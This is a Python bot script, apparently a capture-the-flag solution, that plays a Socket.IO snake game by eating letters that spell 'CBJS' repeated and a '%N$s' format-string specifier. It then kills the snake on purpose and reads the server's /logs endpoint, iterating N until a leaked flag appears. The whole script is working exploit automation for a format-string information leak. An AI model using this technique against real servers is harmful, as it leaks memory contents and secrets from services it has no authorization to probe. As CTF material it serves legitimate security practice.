#!/usr/bin/env python3
import argparse
import math
import time
import random
from typing import List, Optional, Tuple

import requests
import socketio


# ================== Default Config ==================
SCORE_GOAL = 100                 # điểm cần để đủ điều kiện /logs
BURN_BASE_SECONDS = 5.0          # sàn burn tối thiểu (đề phòng lag)
BURN_PER_CHAR_SECONDS = 0.6      # ~0.6s/char; server thường pop ~0.5s/char
REPEL_RADIUS = 220.0             # bán kính né food khi burn
WALL_MARGIN = 110.0              # lề tường: blend về tâm khi bám tường
WALL_BLEND = 0.35
VERBOSE = True
# ====================================================


def clamp_angle(a: float) -> float:
    while a <= -math.pi:
        a += 2 * math.pi
    while a > math.pi:
        a -= 2 * math.pi
    return a


class HardOrderSnakeBot:
    """
    Hard-order + fallback + burn + suicide + (optional) scan %N$s.

    Hai chế độ:
    - Fixed letters: --letters "CBJS...".
    - Scan: --scan (--n-start, --n-end) tự build "CBJS"*5 + f"%{N}$s", pad score, tự sát, /logs dò flag.
    """

    def __init__(
        self,
        server_url: str,
        letters: Optional[str],
        scan_mode: bool,
        n_start: int,
        n_end: int,
        auto_respawn: bool,
        prefer_websocket: bool,
        verbose: bool,
    ):
        self.server_url = server_url.rstrip("/")
        self.scan_mode = scan_mode
        self.n_start = n_start
        self.n_end = n_end
        self.auto_respawn = auto_respawn
        self.prefer_websocket = prefer_websocket
        self.verbose = verbose

        # socket
        self.sio = socketio.Client(
            logger=self.verbose,
            engineio_logger=self.verbose,
            reconnection=True,
            reconnection_attempts=0
        )

        # world & runtime
        self.player_id: Optional[str] = None
        self.world_w: float = 5000.0
        self.world_h: float = 5000.0
        self.snake = None
        self.foods: List[dict] = []

        # target
        self.target_seq: List[str] = []
        self.seq_len = 0
        self.current_scan_index = self.n_start

        # states
        self.mode = "collect"      # collect -> padscore -> suicide
        self.end_requested = False
        self.fallback_taken_this_gap = False
        self.burn_mode = False
        self.burn_started_at = 0.0
        self.have_logged_this_life = False
        self.prev_eaten: List[str] = []
        self.prev_counts = None
        self.last_angle = 0.0

        # finishing
        self.finished = False

        self._wire_events()

        if not self.scan_mode:
            # letters chế độ thường
            s = (letters or "CBJS").upper()
            self._set_target(list(s))

    # ------------- Wire Socket.IO -------------
    def _wire_events(self):
        @self.sio.event
        def connect():
            self._log("[+] Connected. Joining game...")
            self.sio.emit("joinGame", {})

        @self.sio.on("gameJoined")
        def on_joined(data):
            self.player_id = data.get("playerId")
            self.world_w = float(data.get("worldWidth", 5000))
            self.world_h = float(data.get("worldHeight", 5000))
            self.snake = data.get("snake")
            self._log(f"[+] Joined as {self.player_id} | world=({self.world_w}x{self.world_h})")

            if self.scan_mode:
                self._prepare_scan_payload()
            else:
                self._reset_life_state()
            self._print_progress_if_changed()

        @self.sio.on("gameState")
        def on_state(state):
            self._on_game_state(state)

        @self.sio.on("respawned")
        def on_respawned(data):
            self.snake = data.get("snake")
            self._log("[*] Respawned")
            if self.scan_mode:
                # giữ nguyên N hiện tại (đã set trong switch N)
                self._reset_life_state()
            else:
                self._reset_life_state()
            self._print_progress_if_changed()

        @self.sio.event
        def disconnect():
            self._log("[x] Disconnected")

    # ------------- Target helpers -------------
    def _set_target(self, seq: List[str]):
        self.target_seq = [c.upper() for c in seq]
        self.seq_len = len(self.target_seq)
        self.mode = "collect"
        self.end_requested = False
        self.burn_mode = False
        self.burn_started_at = 0.0
        self.fallback_taken_this_gap = False
        self.have_logged_this_life = False
        self.prev_eaten = []
        self.prev_counts = None
        self._log(f"[*] Target set: {''.join(self.target_seq)} (len={self.seq_len})")

    def _prepare_scan_payload(self):
        payload = list(("CBJS" * 5) + f"%{self.current_scan_index}$s")
        self._set_target(payload)
        self._log(f"[*] Scan N={self.current_scan_index} → payload '{''.join(payload)}'")

    def _reset_life_state(self):
        # giữ target; reset trạng thái runtime
        self.mode = "collect"
        self.end_requested = False
        self.burn_mode = False
        self.burn_started_at = 0.0
        self.fallback_taken_this_gap = False
        self.have_logged_this_life = False
        self.prev_eaten = []
        self.prev_counts = None

    def _match_prefix_len(self, eaten: List[str]) -> int:
        m = 0
        for need, got in zip(self.target_seq, eaten):
            if need == got:
                m += 1
            else:
                break
        return m

    def _need_letter(self, eaten: List[str]) -> Optional[str]:
        m = self._match_prefix_len(eaten)
        return self.target_seq[m] if m < self.seq_len else None

    # ------------- Logging helpers -------------
    def _log(self, *a, **k):
        if self.verbose:
            print(*a, **k)

    def _progress_line(self, eaten: List[str]) -> str:
        m = self._match_prefix_len(eaten)
        parts = [f"{ch}{'✓' if i < m else '_'}" for i, ch in enumerate(self.target_seq)]
        bar = " ".join(f"[{p}]" for p in parts)
        mismatch = f"  (tail={eaten[m:]})" if len(eaten) > m else ""
        length = len(self.snake.get("segments", [])) if self.snake else 0
        score = self.snake.get("score", 0) if self.snake else 0
        flags = []
        if self.burn_mode: flags.append("BURN")
        if self.mode == "suicide": flags.append("END")
        flag_s = f"  <{'|'.join(flags)}>" if flags else ""
        return f"{bar}   eaten={eaten}{mismatch} | L={length} S={score}{flag_s}"

    def _print_progress_if_changed(self):
        if not self.verbose:
            return
        eaten = self.snake.get("eatenCharacters", []) if self.snake else []
        m = self._match_prefix_len(eaten)
        key = (m, tuple(eaten), self.burn_mode, self.mode)
        if key != getattr(self, "_last_progress_key", None):
            print("CBJS:", self._progress_line(eaten))
            self._last_progress_key = key

    # ------------- Geometry -------------
    def _head_xy(self) -> Tuple[float, float]:
        if not self.snake:
            return 0.0, 0.0
        segs = self.snake.get("segments") or []
        if segs:
            h = segs[0]
            return float(h.get("x", self.snake.get("x", 0.0))), float(h.get("y", self.snake.get("y", 0.0)))
        return float(self.snake.get("x", 0.0)), float(self.snake.get("y", 0.0))

    @staticmethod
    def _distance(ax, ay, bx, by) -> float:
        return math.hypot(bx - ax, by - ay)

    @staticmethod
    def _angle_to(ax, ay, bx, by) -> float:
        return math.atan2(by - ay, bx - ax)

    @staticmethod
    def _blend_angles(a: float, b: float, factor: float) -> float:
        da = clamp_angle(b - a)
        return clamp_angle(a + factor * da)

    def _set_input(self, angle: Optional[float], boost: bool):
        if angle is None:
            angle = self.last_angle
        else:
            self.last_angle = angle
        self.sio.emit("playerInput", {"direction": float(angle), "isBoosting": bool(boost)})

    # ------------- Food queries -------------
    def _nearest_food_any(self, sx, sy):
        best = None
        bestd = float("inf")
        for f in self.foods:
            d = self._distance(sx, sy, f["x"], f["y"])
            if d < bestd:
                bestd, best = d, f
        return best

    def _nearest_food_char(self, ch, sx, sy):
        best = None
        bestd = float("inf")
        for f in self.foods:
            if str(f.get("char", "")).upper() == ch:
                d = self._distance(sx, sy, f["x"], f["y"])
                if d < bestd:
                    bestd, best = d, f
        return best

    # ------------- /logs -------------
    def _fetch_logs(self):
        url = f"{self.server_url}/logs"
        try:
            r = requests.get(url, params={"socket_id": self.player_id}, timeout=5)
            if r.status_code != 200:
                self._log(f"[logs] HTTP {r.status_code}: {r.text}")
                return None
            return r.json()
        except Exception as e:
            self._log(f"[logs] request failed: {e}")
            return None

    def _extract_flag(self, achievements):
        if not achievements:
            return None
        self._log("=== /logs achievements ===")
        for a in achievements:
            t = a.get("type", "")
            d = a.get("description", "")
            self._log(f"- {t}: {d}")
            for marker in ("DDC{", "flag{", "CTF{", "HTB{", "SEKAI{"):
                if marker in d:
                    s = d[d.find(marker):]
                    if "}" in s:
                        s = s[:s.find("}")+1]
                    return s
        return None

    # ------------- Decision core -------------
    def _decide_collect_or_pad(self, sx, sy, eaten: List[str], score: int) -> Tuple[float, bool]:
        """
        Overlay:
          - Nếu mismatch: burn → về tâm + repel + BOOST, cho tới khi tail sạch.
          - Nếu không mismatch và còn need: bám theo need, né tường.
          - Nếu không có need spawn: fallback ăn 1 viên (ưu tiên ký tự thuộc target), sau đó về tâm chờ.
        """
        cx, cy = self.world_w / 2.0, self.world_h / 2.0

        m = self._match_prefix_len(eaten)
        mismatch_now = len(eaten) > m
        t = time.perf_counter()

        # Toggle burn
        if mismatch_now and not self.burn_mode:
            self.burn_mode = True
            self.burn_started_at = t
            self.fallback_taken_this_gap = True
            self._log(f"[BURN ON] tail={eaten[m:]}")
        elif self.burn_mode and not mismatch_now:
            self.burn_mode = False
            self.burn_started_at = 0.0
            self.fallback_taken_this_gap = False
            self._log("[BURN OFF] sequence fixed")

        # Failsafe burn duration
        if self.burn_mode and self.burn_started_at:
            mismatch_len = max(0, len(eaten) - m)
            if (t - self.burn_started_at) > max(BURN_BASE_SECONDS, BURN_PER_CHAR_SECONDS * mismatch_len):
                self.burn_mode = False
                self.burn_started_at = 0.0
                self._log("[BURN CUT] timeout")

        # Burn: về tâm + repel + BOOST
        if self.burn_mode:
            to_center = self._angle_to(sx, sy, cx, cy)
            repel_angle = None
            nearest_d = float("inf")
            for f in self.foods:
                d = self._distance(sx, sy, f["x"], f["y"])
                if d < REPEL_RADIUS and d < nearest_d:
                    nearest_d = d
                    repel_angle = self._angle_to(sx, sy, 2*sx - f["x"], 2*sy - f["y"])
            angle = to_center if repel_angle is None else self._blend_angles(to_center, repel_angle, 0.35)
            return angle, True

        # Không burn: nếu còn need → đuổi need
        need = self.target_seq[m] if m < self.seq_len else None
        if need is not None:
            target = self._nearest_food_char(need, sx, sy)
            if target:
                angle = self._angle_to(sx, sy, target["x"], target["y"])
                if (sx < WALL_MARGIN) or (sy < WALL_MARGIN) or (self.world_w - sx < WALL_MARGIN) or (self.world_h - sy < WALL_MARGIN):
                    to_center = self._angle_to(sx, sy, cx, cy)
                    angle = self._blend_angles(angle, to_center, WALL_BLEND)
                return angle, False

        # Fallback: ăn 1 viên rồi quay về tâm chờ
        if not self.fallback_taken_this_gap:
            target_chars = set(self.target_seq)
            best, bestd = None, float("inf")
            for f in self.foods:
                if str(f.get("char", "")).upper() in target_chars:
                    d = self._distance(sx, sy, f["x"], f["y"])
                    if d < bestd:
                        bestd, best = d, f
            if best is None:
                best = self._nearest_food_any(sx, sy)
            if best:
                self.fallback_taken_this_gap = True
                angle = self._angle_to(sx, sy, best["x"], best["y"])
                return angle, False

        angle = self._angle_to(sx, sy, cx, cy)
        return angle, False

    def _decide_suicide(self, sx, sy) -> Tuple[float, bool]:
        # Chọn biên gần nhất + BOOST liên tục
        left_d   = sx
        right_d  = self.world_w - sx
        top_d    = sy
        bottom_d = self.world_h - sy

        if left_d <= right_d and left_d <= top_d and left_d <= bottom_d:
            angle = math.pi
        elif right_d <= top_d and right_d <= bottom_d:
            angle = 0.0
        elif top_d <= bottom_d:
            angle = -math.pi / 2
        else:
            angle = math.pi / 2
        return angle, True

    # ------------- Game State handler -------------
    def _on_game_state(self, data: dict):
        snakes = data.get("snakes", [])
        self.foods = data.get("foods", []) or []
        if not snakes:
            return

        # pick our snake
        s = None
        for ss in snakes:
            if (str(ss.get("id")) == str(self.player_id)) or (str(ss.get("playerId")) == str(self.player_id)):
                s = ss
                break
        if s is None:
            s = snakes[0]

        self.snake = s
        eaten = [str(c).upper() for c in s.get("eatenCharacters", [])]
        counts = s.get("letterCounts", {})
        score = int(s.get("score", 0))
        alive = bool(s.get("isAlive", False))
        sx, sy = float(s.get("x", 0)), float(s.get("y", 0))

        # log khi eaten thay đổi
        if eaten != self.prev_eaten:
            if eaten:
                m = self._match_prefix_len(eaten)
                last = eaten[-1]
                need = self.target_seq[m] if m < self.seq_len else None
                if need is not None and last == need:
                    self._log(f"[+] Eat ok: '{last}' ({m+1}/{self.seq_len})")
                elif need is not None:
                    self._log(f"[!] Wrong: '{last}', need '{need}' → burn")
            self._log(f"[HOLD] len={len(eaten)} chars='{''.join(eaten)}'  CBJS={{C:{counts.get('C',0)} B:{counts.get('B',0)} J:{counts.get('J',0)} S:{counts.get('S',0)}}}")
            self.prev_eaten = list(eaten)

        self._print_progress_if_changed()

        # tính trạng thái hoàn tất theo prefix thực (không lệ thuộc con trỏ)
        m = self._match_prefix_len(eaten)
        mismatch_now = len(eaten) > m
        completed = (m >= self.seq_len) and not mismatch_now

        # chuyển mode
        if self.mode == "collect":
            if completed:
                self.mode = "padscore" if (self.scan_mode and score < SCORE_GOAL) else "suicide"
        elif self.mode == "padscore":
            if score >= SCORE_GOAL:
                self.mode = "suicide"
        elif self.mode == "suicide":
            pass

        # chết → /logs (chỉ trong scan), hoặc respawn
        if not alive:
            if self.scan_mode and (not self.have_logged_this_life) and completed and score >= SCORE_GOAL:
                self.have_logged_this_life = True
                self._log("[*] Dead with payload & score≥goal → fetching /logs")
                data = self._fetch_logs()
                if data and "achievements" in data:
                    flag = self._extract_flag(data["achievements"])
                    if flag:
                        print("\n[🎉 FLAG]", flag)
                        self.finished = True
                        self.sio.disconnect()
                        return
                # không thấy flag → next N
                self.current_scan_index += 1
                if self.current_scan_index > self.n_end:
                    print("[×] Exhausted index range without finding flag")
                    self.sio.disconnect()
                    return
                self._log(f"[*] Next N={self.current_scan_index} → respawn")
                self._prepare_scan_payload()
                self.sio.emit("respawn", {})
            else:
                # không scan hoặc chưa đủ điều kiện: respawn nếu bật auto_respawn & chưa kết thúc
                if self.auto_respawn and not self.finished:
                    self._log("[~] Auto-respawn...")
                    self.sio.emit("respawn", {})
            return

        # còn sống → quyết định di chuyển
        if self.mode in ("collect", "padscore"):
            angle, boost = self._decide_collect_or_pad(sx, sy, eaten, score)
            if completed and (not self.end_requested) and (not self.scan_mode or score >= SCORE_GOAL):
                self.mode = "suicide"
                self.end_requested = True
            self._set_input(angle, boost)
        elif self.mode == "suicide":
            angle, boost = self._decide_suicide(sx, sy)
            self._set_input(angle, boost)

    # ------------- Public -------------
    def run(self):
        transports = ["websocket"] if self.prefer_websocket else ["websocket", "polling"]
        self.sio.connect(self.server_url, transports=transports, wait_timeout=10)
        self.sio.wait()


def main():
    p = argparse.ArgumentParser(description="Hard-Order Snake Bot (fallback+burn+suicide) with optional %N$s scan.")
    p.add_argument("--server", default="http://localhost:3000", help="Server URL (e.g., http://178.128.120.209:3000)")
    p.add_argument("--letters", default=None, help="Fixed target sequence (e.g., CBJS or CBJS*5 + %A*27). Ignored if --scan.")
    p.add_argument("--scan", action="store_true", help="Scan mode: build \"CBJS\"*5 + f\"%N$s\" and iterate N.")
    p.add_argument("--n-start", type=int, default=1, help="Scan start N (default 1)")
    p.add_argument("--n-end", type=int, default=40, help="Scan end N (default 40)")
    p.add_argument("--no-auto-respawn", action="store_true", help="Disable auto-respawn when not scanning / not complete")
    p.add_argument("--polling", action="store_true", help="Allow polling fallback (default WS-only)")
    p.add_argument("--quiet", action="store_true", help="Less console logs")
    args = p.parse_args()

    bot = HardOrderSnakeBot(
        server_url=args.server,
        letters=args.letters,
        scan_mode=args.scan,
        n_start=args.n_start,
        n_end=args.n_end,
        auto_respawn=not args.no_auto_respawn,
        prefer_websocket=not args.polling,
        verbose=not args.quiet,
    )
    try:
        bot.run()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
